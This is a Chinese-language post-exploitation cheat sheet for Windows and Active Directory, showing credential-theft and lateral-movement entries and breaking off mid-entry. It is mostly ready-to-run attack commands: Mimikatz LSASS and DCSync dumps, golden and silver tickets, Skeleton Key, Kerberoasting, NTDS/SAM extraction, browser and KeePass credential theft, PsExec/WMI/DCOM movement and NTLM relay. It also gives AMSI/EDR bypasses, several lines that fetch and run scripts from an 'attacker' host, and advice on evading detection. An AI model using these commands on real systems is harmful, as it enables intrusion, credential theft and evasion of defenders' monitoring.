# 内网渗透 / 后渗透速查

_共 128 个结构化 payload，覆盖凭据窃取 / 横向移动 / 权限提升 / 免杀 / 域渗透 / 隧道代理 / 信息收集 / 权限维持_

## 类别索引

| 类别 | 数量 |
|---|--:|
| 凭证窃取 | 20 |
| 横向移动 | 16 |
| 权限提升 | 15 |
| 免杀与规避 | 14 |
| 域渗透攻击 | 14 |
| 隧道代理 | 13 |
| 信息收集 | 12 |
| 权限维持 | 12 |
| Exchange攻击 | 5 |
| ADCS攻击 | 5 |
| SharePoint攻击 | 2 |


## 凭证窃取

### Mimikatz凭证抓取  `mimikatz-creds`
使用Mimikatz抓取Windows系统凭证
子类：**Mimikatz** · tags: `mimikatz` `credentials` `windows` `lsass`

**前置条件：** 需要管理员权限；需要绕过杀毒软件；Windows系统

**攻击链：**

**1. 抓取所有凭证**  _[windows]_
_抓取LSASS中的所有登录凭证_
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**2. 导出LSASS**  _[windows]_
_从LSASS转储文件中提取凭证_
```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

**3. Pass-the-Hash**  _[windows]_
_使用NTLM哈希进行Pass-the-Hash攻击_
```
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:target.com /ntlm:HASH" "exit"
```

**4. DCSync攻击**  _[windows]_
_模拟DC同步获取域内所有用户哈希_
```
mimikatz.exe "lsadump::dcsync /domain:target.com /user:Administrator" "exit"
```

**5. 导出所有哈希**  _[windows]_
_从LSA导出所有用户哈希_
```
mimikatz.exe "lsadump::lsa /inject" "exit"
```

**6. 黄金票据**  _[windows]_
_生成黄金票据获取域管理员权限_
```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator" "exit"
```

**7. 白银票据**  _[windows]_
_生成白银票据访问特定服务_
```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /target:server.target.com /service:cifs /rc4:HASH /user:Administrator" "exit"
```

**EDR 绕过变体：**

**1. PowerShell加载**
_通过PowerShell远程加载Mimikatz_
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"  # security-allowlist: SEC005
```

**2. AMSI绕过**
_禁用AMSI后加载Mimikatz_
```
SET-ITEM -PATH "HKLM:\SOFTWARE\Microsoft\AMSI" -NAME "AllowBlocking" -VALUE 1; IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")  # security-allowlist: SEC005
```

**3. 混淆执行**
_通过反射绕过AMSI_
```
$a='[Ref].Assembly.GetType'('System.Management.Automation.AmsiUtils');$b=$a.GetField'('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')  # security-allowlist: SEC005
```

**分析：** 成功执行后可获取明文密码、NTLM哈希、Kerberos票据等凭证信息。

**OPSEC：** Mimikatz会被大多数杀软检测；使用混淆或内存加载绕过检测；优先考虑使用其他更隐蔽的工具；操作LSASS会触发EDR告警

---

### Kerberoasting攻击  `kerberoasting`
Kerberoasting攻击获取服务账户哈希
子类：**Kerberos** · tags: `kerberoasting` `kerberos` `active-directory` `spn`

**前置条件：** 域环境；任意域用户凭证；域内存在SPN账户

**攻击链：**

**1. 发现SPN**  _[windows]_
_查询域内所有SPN_
```
setspn -T domain.com -Q */*
```

**2. 请求服务票据**  _[windows]_
_PowerShell请求Kerberos票据_
```
Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.target.com"
```

**3. 导出票据**  _[windows]_
_使用Mimikatz导出Kerberos票据_
```
mimikatz.exe "kerberos::list /export" "exit"
```

**4. Rubeus请求**  _[windows]_
_使用Rubeus进行Kerberoasting_
```
Rubeus.exe kerberoast /stats
```

**5. Impacket GetUserSPNs**  _[linux]_
_使用Impacket获取服务票据_
```
GetUserSPNs.py domain/user:password -dc-ip dc_ip -request
```

**6. 离线破解**  _[linux]_
_使用Hashcat破解Kerberos票据_
```
hashcat -m 13100 kerberoast.hash wordlist.txt
```

**EDR 绕过变体：**

**1. RC4加密**
_使用RC4加密，避免触发告警_
```
Rubeus.exe kerberoast /rc4opsec
```

**分析：** Kerberoasting可以获取服务账户的Kerberos票据，离线破解后得到明文密码。

**OPSEC：** Kerberoasting不需要高权限；只需要任意域用户凭证；建议使用RC4加密避免检测

---

### AS-REP Roasting  `asreproasting`
AS-REP Roasting攻击获取用户哈希
子类：**Kerberos** · tags: `asreproasting` `kerberos` `active-directory`

**前置条件：** 域环境；域中存在禁用Pre-auth的用户

**攻击链：**

**1. Rubeus攻击**  _[windows]_
_使用Rubeus进行AS-REP Roasting_
```
Rubeus.exe asreproast
```

**2. Impacket攻击**  _[linux]_
_使用Impacket获取AS-REP_
```
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

**3. 查找禁用Pre-auth用户**  _[windows]_
_查找禁用Pre-auth的用户_
```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

**4. 破解哈希**  _[linux]_
_使用Hashcat破解AS-REP哈希_
```
hashcat -m 18200 asrep.hash wordlist.txt
```

**分析：** AS-REP Roasting可以获取禁用Pre-auth用户的哈希，离线破解后得到明文密码。

**OPSEC：** 不需要任何凭证；只需要用户名；禁用Pre-auth是错误配置

---

### LaZagne凭证抓取  `lazagne-creds`
使用LaZagne抓取各种应用程序凭证
子类：**工具** · tags: `lazagne` `credentials` `browsers` `applications`

**前置条件：** 目标机器访问权限；LaZagne工具

**攻击链：**

**1. 抓取所有凭证**  _[windows]_
_抓取所有支持的凭证_
```
laZagne.exe all
```

**2. 浏览器凭证**  _[windows]_
_抓取浏览器保存的密码_
```
laZagne.exe browsers
```

**3. WiFi凭证**  _[windows]_
_抓取WiFi密码_
```
laZagne.exe wifi
```

**4. 邮件客户端**  _[windows]_
_抓取邮件客户端密码_
```
laZagne.exe mails
```

**5. 数据库凭证**  _[windows]_
_抓取数据库客户端密码_
```
laZagne.exe databases
```

**6. Linux版本**  _[linux]_
_Linux版本抓取_
```
python laZagne.py all
```

**EDR 绕过变体：**

**1. 混淆执行**
_Base64编码执行_
```
python -c "exec(__import__(\"base64\").b64decode(\"BASE64_PAYLOAD\"))"
```

**分析：** LaZagne可以从浏览器、邮件客户端、数据库客户端等多种应用程序中提取保存的凭证。

**OPSEC：** LaZagne会被杀软检测；考虑使用混淆或内存加载；可以只运行特定模块

---

### SAM数据库导出  `sam-dump`
导出Windows SAM数据库获取本地账户哈希
子类：**SAM** · tags: `sam` `hash` `windows` `local`

**前置条件：** 管理员权限；Windows系统

**攻击链：**

**1. reg导出**  _[windows]_
_导出SAM和SYSTEM配置单元_
```
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
```

**2. Impacket解析**  _[linux]_
_使用Impacket解析SAM_
```
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

**3. Mimikatz导出**  _[windows]_
_使用Mimikatz导出SAM_
```
mimikatz.exe "lsadump::sam" "exit"
```

**4. Volume Shadow Copy**  _[windows]_
_从卷影副本复制SAM_
```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.hive
```

**分析：** SAM数据库包含本地账户的NTLM哈希，可以用于破解或Pass-the-Hash。

**OPSEC：** 需要管理员权限；操作注册表可能触发告警；卷影副本方法更隐蔽

---

### NTDS.dit导出  `ntds-dump`
导出Active Directory数据库获取所有域用户哈希
子类：**NTDS** · tags: `ntds` `active-directory` `hash` `domain`

**前置条件：** 域管理员权限；域控制器访问权限

**攻击链：**

**1. ntdsutil快照**  _[windows]_
_使用ntdsutil创建IFM快照_
```
ntdsutil "activate instance ntds" "ifm" "create full c:\temp" "quit" "quit"
```

**2. Volume Shadow Copy**  _[windows]_
_从卷影副本复制NTDS.dit_
```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
```

**3. Impacket解析**  _[linux]_
_使用Impacket解析NTDS.dit_
```
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

**4. Impacket远程转储**  _[linux]_
_远程转储域哈希_
```
secretsdump.py domain/admin:password@dc_ip -just-dc
```

**5. Mimikatz DCSync**  _[windows]_
_使用DCSync同步所有哈希_
```
mimikatz.exe "lsadump::dcsync /domain:target.com /all" "exit"
```

**分析：** NTDS.dit包含域内所有用户的哈希，可以用于破解或Pass-the-Hash。

**OPSEC：** 需要域管理员权限；DCSync方法更隐蔽；操作可能触发大量告警

---

### GPP密码提取  `gpp-password`
提取组策略首选项中的密码
子类：**GPP** · tags: `gpp` `group-policy` `password` `xml`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 查找GPP文件**  _[linux]_
_查找SYSVOL中的XML文件_
```
find /domain/sysvol -name "*.xml" 2>/dev/null
```

**2. PowerShell查找**  _[windows]_
_PowerShell查找GPP文件_
```
Get-ChildItem -Path "\\domain.com\SYSVOL" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "\.xml$"}
```

**3. PowerView提取**  _[windows]_
_使用PowerView提取GPP密码_
```
Get-NetGPPPassword
```

**4. gpp-decrypt**  _[linux]_
_解密GPP密码哈希_
```
gpp-decrypt HASH
```

**5. Impacket提取**  _[linux]_
_使用Impacket提取GPP密码_
```
Get-GPPPassword.py domain/user:password@dc_ip
```

**分析：** GPP密码使用公开的密钥加密，可以被解密获取明文密码。

**OPSEC：** GPP密码是常见的信息泄露点；只需要普通域用户权限；MS14-025修复后新密码不会被存储

---

### Mimikatz高级技巧  `mimikatz-advanced`
Mimikatz高级凭证提取和利用技术
子类：**Mimikatz** · tags: `mimikatz` `credentials` `advanced`

**前置条件：** 管理员权限；Mimikatz工具

**攻击链：**

**1. DCSync攻击**  _[windows]_
_模拟DC同步获取域管哈希_
```
lsadump::dcsync /domain:domain.com /user:Administrator
```

**2. 黄金票据生成**  _[windows]_
_生成黄金票据并注入_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt
```

**3. 白银票据生成**  _[windows]_
_生成白银票据访问特定服务_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt
```

**4. Skeleton Key植入**  _[windows]_
_植入万能密码mimikatz_
```
privilege::debug
misc::skeleton
```

---

### 浏览器凭证提取  `browser-creds`
从浏览器中提取保存的密码和Cookie
子类：**浏览器** · tags: `browser` `credentials` `chrome` `firefox`

**前置条件：** 用户权限；浏览器已保存密码

**攻击链：**

**1. Chrome密码提取**  _[windows]_
_复制Chrome登录数据库_
```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" | Copy-Item -Destination "C:\temp\Login Data"
```

**2. Chrome Cookie提取**  _[windows]_
_复制Chrome Cookie数据库_
```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" | Copy-Item -Destination "C:\temp\Cookies"
```

**3. 使用SharpWeb**  _[windows]_
_使用SharpWeb提取浏览器凭证_
```
SharpWeb.exe --browser chrome
```

**4. 使用HackBrowserData**
_提取Chrome所有数据_
```
hack-browser-data.exe -b chrome
```

---

### DPAPI凭证提取  `dpapi-creds`
从DPAPI保护存储中提取凭证
子类：**DPAPI** · tags: `dpapi` `credentials` `windows`

**前置条件：** 用户权限；DPAPI master key

**攻击链：**

**1. 枚举DPAPI凭据**  _[windows]_
_查找DPAPI保护的凭据文件_
```
Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -Force
```

**2. 使用Mimikatz解密**  _[windows]_
_解密DPAPI凭据_
```
dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\XXX
```

**3. 获取Master Key**  _[windows]_
_从内存获取DPAPI master key_
```
sekurlsa::dpapi
```

---

### RDP凭证提取  `rdp-creds`
提取保存的RDP连接密码
子类：**RDP** · tags: `rdp` `credentials` `windows`

**前置条件：** 用户权限；已保存RDP密码

**攻击链：**

**1. 查找RDP文件**  _[windows]_
_查找RDP连接文件_
```
Get-ChildItem -Path "$env:USERPROFILE\Documents\*.rdp" -Recurse
```

**2. 提取RDP密码**  _[windows]_
_列出保存的凭据_
```
cmdkey /list
```

**3. 使用Mimikatz**  _[windows]_
_解密RDP保存的密码_
```
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\XXX
```

---

### WiFi凭证提取  `wifi-creds`
提取保存的WiFi密码
子类：**WiFi** · tags: `wifi` `credentials` `windows`

**前置条件：** 管理员权限；已连接WiFi

**攻击链：**

**1. 列出WiFi配置文件**  _[windows]_
_显示所有WiFi配置文件_
```
netsh wlan show profiles
```

**2. 提取WiFi密码**  _[windows]_
_显示WiFi密码_
```
netsh wlan show profile name="WiFi_Name" key=clear
```

---

### Windows Vault凭证  `vault-creds`
从Windows凭据管理器提取凭证
子类：**Vault** · tags: `vault` `credentials` `windows`

**前置条件：** 用户权限；已保存凭据

**攻击链：**

**1. 列出Vault凭据**  _[windows]_
_列出所有Vault_
```
vaultcmd /list
```

**2. 导出Vault凭据**  _[windows]_
_列出Windows凭据_
```
vaultcmd /listcreds:"Windows Credentials" /all
```

**3. 使用Mimikatz**  _[windows]_
_从内存提取凭据管理器密码_
```
sekurlsa::credman
```

---

### KeePass凭证提取  `keepass-dump`
从KeePass数据库提取密码
子类：**KeePass** · tags: `keepass` `credentials` `password-manager`

**前置条件：** KeePass数据库文件；主密码或内存转储

**攻击链：**

**1. 查找KeePass数据库**  _[windows]_
_搜索KeePass数据库文件_
```
Get-ChildItem -Path C:\ -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue
```

**2. 内存提取主密码**  _[windows]_
_从KeePass进程内存提取_
```
使用KeePassDump或KeeThief从内存提取主密码
```

**3. 使用KeeThief**  _[windows]_
_PowerShell提取KeePass密码_
```
powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/KeeThief.ps1'); Get-KeePassPw  # security-allowlist: SEC005
```

---

### LSA Secrets提取  `lsa-secrets`
从LSA Secrets提取敏感数据
子类：**LSA** · tags: `lsa` `secrets` `windows`

**前置条件：** SYSTEM权限

**攻击链：**

**1. 使用Mimikatz**  _[windows]_
_提取LSA Secrets_
```
lsadump::secrets
```

**2. 使用reg save**  _[windows]_
_导出注册表hive离线分析_
```
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive
```

**3. 使用Impacket**  _[linux]_
_离线提取LSA Secrets_
```
secretsdump.py -security security.hive -system system.hive LOCAL
```

---

### 缓存凭证提取  `cached-creds`
提取域缓存凭证
子类：**缓存** · tags: `cached` `credentials` `domain`

**前置条件：** SYSTEM权限；域环境

**攻击链：**

**1. 使用Mimikatz**  _[windows]_
_提取缓存域凭证_
```
lsadump::cache
```

**2. 使用reg save**  _[windows]_
_导出SECURITY hive_
```
reg save HKLM\SECURITY security.hive
```

**3. 离线破解**  _[linux]_
_缓存凭证可离线破解_
```
使用hashcat破解缓存的域凭证
```

---

### DCSync攻击  `dcsync-attack`
模拟域控制器同步获取凭证
子类：**域渗透** · tags: `dcsync` `domain-controller` `mimikatz`

**前置条件：** 域管理员权限或特定权限

**攻击链：**

**1. 使用Mimikatz**  _[windows]_
_使用Mimikatz执行DCSync_
```
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator
```

**2. 使用impacket**  _[linux]_
_使用impacket执行DCSync_
```
python secretsdump.py -just-dc-user Administrator domain.com/user:password@dc_ip
```

**3. 导出所有哈希**  _[windows]_
_导出域内所有用户哈希_
```
mimikatz # lsadump::dcsync /domain:domain.com /all /csv
```

**4. 权限要求**
_DCSync所需权限_
```
需要以下权限之一:
- Domain Admin
- Enterprise Admin
- 复制目录更改权限
```

---

### 黄金票据攻击  `golden-ticket`
使用krbtgt哈希生成黄金票据
子类：**域持久化** · tags: `golden-ticket` `krbtgt` `kerberos`

**前置条件：** krbtgt账户哈希；域SID

**攻击链：**

**1. 获取krbtgt哈希**  _[windows]_
_获取krbtgt账户哈希_
```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

**2. 获取域SID**  _[windows]_
_获取域SID_
```
whoami /user
或: wmic useraccount get sid
```

**3. 生成黄金票据**  _[windows]_
_生成并注入黄金票据_
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

**4. 验证票据**  _[windows]_
_验证黄金票据是否有效_
```
klist
或: dir \\dc.domain.com\c$
```

---

### 白银票据攻击  `silver-ticket`
使用服务账户哈希生成白银票据
子类：**域持久化** · tags: `silver-ticket` `kerberos` `service`

**前置条件：** 服务账户哈希；域SID

**攻击链：**

**1. 获取服务哈希**  _[windows]_
_获取服务账户哈希_
```
mimikatz # sekurlsa::logonpasswords
寻找服务账户NTLM哈希
```

**2. 生成白银票据**  _[windows]_
_生成针对特定服务的票据_
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt
```

**3. 常见服务类型**
_可伪造的服务类型_
```
CIFS - 文件共享
HTTP - Web服务
LDAP - 目录服务
MSSQLSvc - SQL服务
HOST - 远程管理
```

---

### 无人值守安装凭证提取  `unattended-creds`
从Windows无人值守安装文件(Unattend.xml/Sysprep)中提取明文或Base64编码的管理员凭证
子类：**文件凭证** · tags: `credentials` `unattend` `sysprep` `privilege-escalation` `windows`

**前置条件：** 本地文件系统读取权限；目标使用过无人值守部署

**攻击链：**

**1. 搜索无人值守安装文件**  _[windows]_
_在默认路径搜索Unattend/Sysprep配置文件，这些文件在Windows自动部署后可能残留在系统中_
```
dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\Panther\unattended.xml C:\Windows\Panther\Autounattend.xml C:\Windows\System32\Sysprep\sysprep.xml C:\Windows\System32\Sysprep\unattend.xml 2>nul
```

**2. 全盘搜索Unattend文件**  _[windows]_
_当默认路径找不到时，全盘递归搜索所有可能的无人值守文件_
```
# CMD方式
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml 2>nul

# PowerShell方式
Get-ChildItem -Path C:\ -Recurse -Include "*unattend*","*sysprep*","*autounattend*" -ErrorAction SilentlyContinue | Select-Object FullName
```

**3. 提取明文密码**  _[windows]_
_从Unattend.xml中提取密码字段，密码可能以明文或Base64编码形式存储在<Password>/<AdminPassword>/<AutoLogon>节点中_
```
# 查看文件内容
type C:\Windows\Panther\Unattend.xml

# 关键字段搜索
findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml

# PowerShell提取
[xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }
```

**4. 解码Base64密码**  _[windows]_
_Unattend.xml中的密码如果以Base64编码存储，需要解码。Windows使用UTF-16LE编码，因此必须用Unicode解码而非ASCII_
```
# PowerShell解码Base64
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # 从XML提取的编码值
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# 或者使用certutil
echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
type C:\temp\decoded.txt
```

**5. 检查其他敏感安装文件**  _[windows]_
_除Unattend.xml外，其他位置也可能存储明文凭证_
```
# 检查GPP(Group Policy Preferences)密码
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml 2>nul

# 检查IIS配置文件
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"

# 检查VNC密码文件
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul

# 检查WiFi密码
netsh wlan show profiles
netsh wlan show profile name="目标WiFi" key=clear
```

**6. 使用Metasploit自动化**  _[windows]_
_使用Metasploit后渗透模块自动搜索和提取无人值守安装文件中的凭证_
```
# Metasploit模块
use post/windows/gather/enum_unattend
set SESSION 1
run

# 也可以使用
use post/multi/gather/firefox_creds
use post/windows/gather/credentials/gpp
use post/windows/gather/cachedump
```

**EDR 绕过变体：**

**1. 绕过文件访问监控**  _[windows]_
_通过卷影副本或流式读取绕过文件访问监控_
```
# 使用Volume Shadow Copy读取被锁定的文件
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\Panther\Unattend.xml C:\temp\u.xml

# 使用PowerShell流式读取避免文件锁
[IO.File]::ReadAllText("C:\Windows\Panther\Unattend.xml")
```

**分析：** 无人值守安装文件是Windows大规模部署的产物。这些XML文件中的<UserAccounts>/<AutoLogon>节点可能包含本地管理员或域管理员的明文/编码凭证。该漏洞在企业环境中极为常见，因为IT部门经常忽略部署后清理这些文件。

**OPSEC：** 读取文件操作通常不会触发警报，但大量文件搜索(dir /s)可能被EDR检测。建议直接检查已知路径而非全盘搜索。

---


## 横向移动

### PsExec横向移动  `lateral-psexec`
使用PsExec进行横向移动
子类：**SMB** · tags: `psexec` `lateral` `smb` `windows`

**前置条件：** 目标机器开放445端口；拥有目标机器管理员凭证；ADMIN$共享可访问

**攻击链：**

**1. 基本使用**  _[linux]_
_使用Impacket的psexec.py连接目标_
```
psexec.py domain/user:password@target_ip
```

**2. 使用哈希连接**  _[linux]_
_使用NTLM哈希进行Pass-the-Hash_
```
psexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**3. 执行命令**  _[linux]_
_在目标机器执行命令_
```
psexec.py domain/user:password@target_ip "whoami"
```

**4. Windows PsExec**  _[windows]_
_使用Sysinternals PsExec_
```
PsExec.exe \\target_ip -u domain\user -p password cmd.exe
```

**EDR 绕过变体：**

**1. 自定义服务名**
_使用自定义服务名避免检测_
```
psexec.py -service-name CustomService domain/user:password@target_ip
```

**2. SMBExec替代**
_使用smbexec.py，不写入磁盘_
```
smbexec.py domain/user:password@target_ip
```

**分析：** PsExec通过SMB协议在目标机器创建服务并执行命令，成功后可获得目标机器的Shell。

**OPSEC：** PsExec会在目标机器创建服务，容易被检测；服务名称和二进制文件可能触发告警；考虑使用更隐蔽的横向移动方式

---

### WMI横向移动  `lateral-wmi`
使用WMI进行横向移动
子类：**WMI** · tags: `wmi` `lateral` `windows` `remote`

**前置条件：** 目标机器开放135端口；拥有目标机器管理员凭证；WMI服务可访问

**攻击链：**

**1. WMI执行命令**  _[windows]_
_使用WMIC远程执行命令_
```
wmic /node:target_ip /user:domain\user /password:pass process call create "cmd.exe /c whoami"
```

**2. Impacket wmiexec**  _[linux]_
_使用Impacket的wmiexec.py_
```
wmiexec.py domain/user:password@target_ip
```

**3. 使用哈希**  _[linux]_
_Pass-the-Hash通过WMI_
```
wmiexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**4. PowerShell WMI**  _[windows]_
_使用PowerShell WMI_
```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred
```

**EDR 绕过变体：**

**1. WMI事件订阅**
_通过WMI安装MSI包执行代码_
```
wmic /node:target_ip /user:domain\user /password:pass path win32_product call install /package:"\\attacker\share\malware.msi"
```

**分析：** WMI横向移动不会在目标机器创建服务，相对PsExec更隐蔽。

**OPSEC：** WMI执行不会留下明显的文件痕迹；但WMI活动可能被监控；命令输出通过临时文件获取

---

### Pass-the-Hash攻击  `pass-the-hash`
使用NTLM哈希进行身份验证
子类：**认证攻击** · tags: `pth` `ntlm` `hash` `authentication`

**前置条件：** 获取用户NTLM哈希；目标机器允许NTLM认证；目标机器开放SMB/WMI端口

**攻击链：**

**1. Impacket PtH**  _[linux]_
_使用Impacket进行PtH_
```
psexec.py -hashes :NTHASH domain/user@target_ip
```

**2. CrackMapExec PtH**  _[linux]_
_使用CrackMapExec进行PtH_
```
crackmapexec smb target_ip -u user -H NTHASH -d domain
```

**3. Windows PtH**  _[windows]_
_使用Mimikatz进行PtH_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH
```

**4. PowerShell PtH**  _[windows]_
_使用PowerShell进行PtH_
```
Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip
```

**EDR 绕过变体：**

**1. Overpass-the-Hash**
_将哈希转换为Kerberos票据_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe
```

**分析：** PtH成功后可以该用户身份访问目标机器，无需明文密码。

**OPSEC：** PtH不会产生登录日志中的密码验证；但会留下网络登录日志；注意时间戳和来源IP

---

### NTLM Relay攻击  `ntlm-relay`
NTLM中继攻击技术
子类：**认证攻击** · tags: `ntlm` `relay` `smb` `authentication`

**前置条件：** 目标机器开放SMB端口；目标机器未启用SMB签名；可诱导目标机器认证

**攻击链：**

**1. Responder监听**  _[linux]_
_启动Responder监听NTLM认证_
```
responder -I eth0 -wrf
```

**2. ntlmrelayx攻击**  _[linux]_
_使用ntlmrelayx进行中继攻击_
```
ntlmrelayx.py -tf targets.txt -smb2support
```

**3. 中继到LDAP**  _[linux]_
_中继到LDAP进行权限提升_
```
ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user
```

**4. IPv6中继**  _[linux]_
_使用IPv6进行NTLM中继_
```
mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip
```

**EDR 绕过变体：**

**1. Drop the MIC**
_移除MIC标志绕过签名验证_
```
ntlmrelayx.py -t smb://target --remove-mic
```

**分析：** NTLM Relay成功后可以获取目标机器的访问权限或提升域权限。

**OPSEC：** 需要目标机器未启用SMB签名；域控制器默认启用签名；IPv6中继更隐蔽

---

### WinRM横向移动  `lateral-winrm`
通过WinRM进行横向移动
子类：**WinRM** · tags: `winrm` `lateral` `powershell`

**前置条件：** WinRM启用；有效凭证

**攻击链：**

**1. PowerShell远程**  _[windows]_
_PowerShell远程会话_
```
Enter-PSSession -ComputerName target -Credential $cred
```

**2. 执行命令**  _[windows]_
_远程执行命令_
```
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred
```

**3. evil-winrm**  _[linux]_
_使用evil-winrm连接_
```
evil-winrm -i target -u user -p password
```

---

### DCOM横向移动  `lateral-dcom`
通过DCOM进行横向移动
子类：**DCOM** · tags: `dcom` `lateral` `com`

**前置条件：** DCOM启用；有效凭证

**攻击链：**

**1. MMC20.Application**  _[windows]_
_通过MMC DCOM执行命令_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
```

**2. ShellBrowserWindow**  _[windows]_
_通过ShellBrowserWindow执行_
```
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","c:\windows\system32",$null,0)
```

**3. Excel DCOM**  _[windows]_
_通过Excel DCOM执行_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c calc.exe")
```

---

### SSH横向移动  `lateral-ssh`
通过SSH进行横向移动
子类：**SSH** · tags: `ssh` `lateral` `linux`

**前置条件：** SSH服务；有效凭证

**攻击链：**

**1. SSH连接**  _[linux]_
_基础SSH连接_
```
ssh user@target
```

**2. SSH密钥认证**  _[linux]_
_使用私钥连接_
```
ssh -i private_key user@target
```

**3. SSH跳板**  _[linux]_
_通过跳板机连接_
```
ssh -J jump_host user@target
```

---

### RDP会话劫持  `rdp-hijack`
劫持已存在的RDP会话
子类：**RDP** · tags: `rdp` `hijack` `session`

**前置条件：** SYSTEM权限；存在RDP会话

**攻击链：**

**1. 列出会话**  _[windows]_
_列出所有用户会话_
```
query user
```

**2. 劫持会话**  _[windows]_
_劫持指定会话_
```
tscon SESSION_ID /dest:console
```

**3. 使用Mimikatz**  _[windows]_
_使用Mimikatz劫持_
```
ts::sessions
ts::remote /id:SESSION_ID
```

---

### Overpass-the-Hash  `overpass-the-hash`
使用哈希获取Kerberos票据
子类：**PtH** · tags: `pth` `kerberos` `hash`

**前置条件：** 用户NTLM哈希；域环境

**攻击链：**

**1. Mimikatz**  _[windows]_
_使用哈希获取Kerberos票据_
```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt
```

**2. Rubeus**  _[windows]_
_使用Rubeus获取票据_
```
Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt
```

**3. Impacket**  _[linux]_
_获取Kerberos票据_
```
getTGT.py domain.com/user -hashes :HASH
```

---

### Pass-the-Ticket  `pass-the-ticket`
使用Kerberos票据进行横向移动
子类：**PtT** · tags: `ptt` `kerberos` `ticket`

**前置条件：** 有效Kerberos票据

**攻击链：**

**1. 导出票据**  _[windows]_
_从内存导出Kerberos票据_
```
sekurlsa::tickets /export
```

**2. 注入票据**  _[windows]_
_注入票据到当前会话_
```
kerberos::ptt ticket.kirbi
```

**3. Rubeus导入**  _[windows]_
_使用Rubeus注入票据_
```
Rubeus.exe ptt /ticket:base64ticket
```

---

### SMBExec横向移动  `lateral-smbexec`
通过SMB执行命令
子类：**SMB** · tags: `smb` `lateral` `exec`

**前置条件：** SMB访问权限；管理员权限

**攻击链：**

**1. Impacket smbexec**  _[linux]_
